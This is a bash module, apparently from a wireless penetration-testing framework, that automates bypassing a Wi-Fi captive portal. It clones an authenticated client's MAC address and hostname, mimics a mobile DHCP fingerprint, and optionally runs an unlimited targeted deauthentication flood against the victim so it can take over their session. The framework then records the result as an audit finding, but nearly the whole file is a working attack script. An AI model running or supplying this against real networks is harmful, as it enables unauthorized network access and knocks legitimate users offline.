#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Bypass"
# CATEGORY="F"
# DEPS="A4"
# CRITICAL="no"
# TOOLS="macchanger,curl,aireplay-ng"
# DESC="Bypass captive portal via MAC spoofing of authenticated clients"
# REQS="managed_iface,target_ssid"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/f4_portal_bypass.sh
#  F4: Captive Portal Bypass (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Identify authenticated MACs from A4 Client Fingerprinting.
#  2. Interactive Selection: Select a target MAC to clone.
#  3. Deauthenticate the victim to prevent ACK storms/collisions.
#  4. Spoof local MAC and request DHCP to hijack the session.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
    echo -e "[*] Session hijacking is highly unstable at this distance."
    stty sane
    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET} ")" snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
# ...

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Initializing Captive Portal Bypass tactical options..."

# 1. Identity Selection
# ... (Finding A4 file logic)

echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select target MAC to clone:${C_RESET}"
for i in "${!CLIENTS[@]}"; do
    echo "    $((i+1))) ${CLIENTS[$i]}"
done
stty sane
read -p "$(echo -e "${C_ACTION} Selection [1-${#CLIENTS[@]}]: ${C_RESET} ")" choice

if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -le ${#CLIENTS[@]} ]]; then
    VICTIM_MAC="${CLIENTS[$((choice-1))]}"
    echo -e "[*] Target Victim: ${C_VAR}$VICTIM_MAC${C_RESET}"
else
    echo -e "${C_PROMPT}[!]${C_RESET} Invalid selection."
    exit 1
fi

# 2. Roaming / Suppression
echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Suppress victim to prevent IP/ACK collision?${C_RESET}"
echo "    1) YES (Targeted Deauth flood - Stealthier)"
echo "    2) NO (Risk instability)"
stty sane
read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET} ")" deauth_choice

if [[ "$deauth_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo "[*] Starting victim suppression in background..."
    aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$VICTIM_MAC" "$INTERFACE" > /dev/null 2>&1 &
    DEAUTH_PID=$!
    trap 'kill $DEAUTH_PID 2>/dev/null || true' EXIT
fi

# 3. Spoofing Execution
echo "[*] Executing Full Identity Spoofing for $VICTIM_MAC..."
ip link set "$INTERFACE" down
macchanger -m "$VICTIM_MAC" "$INTERFACE"

# Spoof Hostname (Advanced Evasion)
OLD_HOSTNAME=$(hostname)
SPOOFED_HOSTNAME="iPad-of-$(echo $VICTIM_MAC | cut -d: -f5,6 | tr -d ':')"
echo "[*] Temporarily spoofing hostname to $SPOOFED_HOSTNAME..."
hostname "$SPOOFED_HOSTNAME"
trap "hostname $OLD_HOSTNAME" EXIT

ip link set "$INTERFACE" up

echo "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
# Create custom dhclient.conf to mimic iOS/Android parameters
DHCP_CONF="${EVIDENCE_DIR}/f4_dhclient.conf"
cat <<EOF > "$DHCP_CONF"
send host-name "$SPOOFED_HOSTNAME";
request subnet-mask, broadcast-address, time-offset, routers,
        domain-name, domain-name-servers, domain-search, host-name,
        netbios-name-servers, netbios-scope, interface-mtu,
        rfc3442-classless-static-routes, ntp-servers;
EOF

timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true

# 4. Verification
echo "[*] Verifying internet access..."
BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_bypass.log"
if curl -s --connect-timeout 5 http://www.google.com > /dev/null; then
    echo "[!] SUCCESS: CAPTIVE PORTAL BYPASSED!" | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Captive Portal Bypass Successful" \
        --severity CRITICAL \
        --desc "Successfully bypassed captive portal for SSID $SSID by spoofing authenticated MAC $VICTIM_MAC." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Captive portals that rely solely on MAC addresses for session tracking are highly vulnerable to identity cloning."
else
    echo "[+] Bypass attempt complete. No internet access detected." | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F4] Audit Complete" \
        --severity INFO \
        --desc "Attempted MAC spoofing bypass for $SSID. Unrestricted access not achieved." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Bypass failure may indicate advanced session tracking (e.g., sequence numbering, browser fingerprinting) or lack of active authorized sessions."
fi

# 5. Restore MAC (Optional but good practice)
echo "[?] Restore original MAC? [y/N]"
read -r restore
if [[ "$restore" == "y" ]]; then
    ip link set "$INTERFACE" down
    macchanger -p "$INTERFACE"
    ip link set "$INTERFACE" up
fi

exit 0
